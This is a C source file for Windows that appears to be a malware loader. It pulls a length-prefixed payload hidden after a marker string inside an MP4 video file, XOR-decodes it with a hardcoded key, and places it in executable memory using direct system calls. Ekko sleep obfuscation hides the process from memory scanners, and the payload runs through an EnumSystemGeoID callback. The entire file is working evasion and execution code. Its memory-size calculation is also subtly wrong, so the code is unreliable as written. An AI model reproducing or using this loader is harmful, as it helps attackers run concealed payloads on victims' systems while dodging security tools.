#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include "syscalls_mem.h"
#include <processthreadsapi.h>
#include "Common.h"
#include "Ekko.h"


int SearchPrependSequence(const char* filePath, const unsigned char* prependSequence, int prependLength)
{
    FILE* file;
    fopen_s(&file, filePath, "rb");
    if (!file)
    {
        return -1;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* fileData = (unsigned char*)malloc(fileSize);
    if (!fileData)
    {
        fclose(file);
        return -1;
    }

    if (fread(fileData, 1, fileSize, file) != (size_t)fileSize)
    {
        fclose(file);
        free(fileData);
        return -1;
    }

    fclose(file);

    for (int i = 0; i <= fileSize - prependLength; i++)
    {
        int found = 1;
        for (int j = 0; j < prependLength; j++)
        {
            if (fileData[i + j] != prependSequence[j])
            {
                found = 0;
                break;
            }
        }

        if (found)
        {
            free(fileData);
            return i;
        }
    }

    free(fileData);
    return -1;
}

unsigned char* ReadSizeBytes(const char* filePath, int startIndex, int sizeBytesLength)
{
    FILE* file;
    fopen_s(&file, filePath, "rb");
    if (!file)
    {
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (startIndex + sizeBytesLength > fileSize)
    {
        fclose(file);
        return NULL;
    }

    unsigned char* sizeBytes = (unsigned char*)malloc(sizeBytesLength);
    if (!sizeBytes)
    {
        fclose(file);
        return NULL;
    }

    fseek(file, startIndex, SEEK_SET);
    if (fread(sizeBytes, 1, sizeBytesLength, file) != (size_t)sizeBytesLength)
    {
        fclose(file);
        free(sizeBytes);
        return NULL;
    }

    fclose(file);
    return sizeBytes;
}

unsigned char* ReadRawData(const char* filePath, int startIndex, int rawDataSize)
{
    FILE* file;
    fopen_s(&file, filePath, "rb");
    if (!file)
    {
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (startIndex + rawDataSize > fileSize)
    {
        fclose(file);
        return NULL;
    }

    unsigned char* rawData = (unsigned char*)malloc(rawDataSize);
    if (!rawData)
    {
        fclose(file);
        return NULL;
    }

    fseek(file, startIndex, SEEK_SET);
    if (fread(rawData, 1, rawDataSize, file) != (size_t)rawDataSize)
    {
        fclose(file);
        free(rawData);
        return NULL;
    }

    fclose(file);
    return rawData;
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int ExecuteSc(unsigned char* shellcode)
{
    SIZE_T shellcodeSize = sizeof shellcode;
    PVOID baseAddress = NULL;

    HANDLE currentProcessHandle = GetCurrentProcess();

    // Allocate size in memory
    NTSTATUS status;
    status = NtAllocateVirtualMemory(currentProcessHandle, &baseAddress, 0, (PSIZE_T)&shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != 0x00000000) {
        printf("Failed allocating memory");
        return;
    }

    //Sleep Ekko
    EkkoObf(5 * 1000);

    // Write shellcode to memory
    status = NtWriteVirtualMemory(currentProcessHandle, baseAddress, (PVOID)shellcode, shellcodeSize, NULL);
    if (status != 0x00000000) {
        printf("Failed writing memory");
        return;
    }

    // XOR decode shellcode at it's memory address
    char key[] = "afdsjkljklfasdjlkfsadjlkafsd";
    XOR((char*)baseAddress, shellcodeSize, key, sizeof(key));

    //Sleep Ekko
    EkkoObf(7 * 1000);


    // Callback EnumSystemGeoID function
    BOOL res;
    res = EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)baseAddress);
    if (!res) {
        printf("Failed callback function");
        return;
    }
    
    // Cleanup
    free(shellcode);
    return 0;
}

int main()
{
    const char* filePath = "embedded.mp4";
    const unsigned char prependSequence[] = { 0x4d, 0x75, 0x73, 0x69, 0x63, 0x49, 0x73, 0x46, 0x6f, 0x72, 0x54, 0x68, 0x65, 0x42, 0x69, 0x72, 0x64, 0x73, 0x21 };    // MusicIsForTheBirds!
    int prependLength = sizeof(prependSequence) / sizeof(prependSequence[0]);

    int prependIndex = SearchPrependSequence(filePath, prependSequence, prependLength);

    if (prependIndex >= 0)
    {
        unsigned char* sizeBytes = ReadSizeBytes(filePath, prependIndex + prependLength, 4);
        if (!sizeBytes)
        {
            return 1;
        }

        int rawDataSize = *(int*)sizeBytes;
        free(sizeBytes);


        unsigned char* shellcode = ReadRawData(filePath, prependIndex + prependLength + 4, rawDataSize);
        if (!shellcode)
        {
            return 1;
        }

        // DEBUGGING print final shellcode
        printf("Shellcode extracted: \n");
        for (int i = 0; i < rawDataSize; i++)
        {
            printf("%02X ", shellcode[i]);
        }
        printf("\n");
        

        // First sleep Ekko
        EkkoObf(10 * 1000);

        // Execute shellcode with direct syscalls and callback function
        int res = ExecuteSc(shellcode);
        if (res != 0)
        {
            return 1;
        }

    }
    else
    {
        return 1;
    }

    return 0;
}
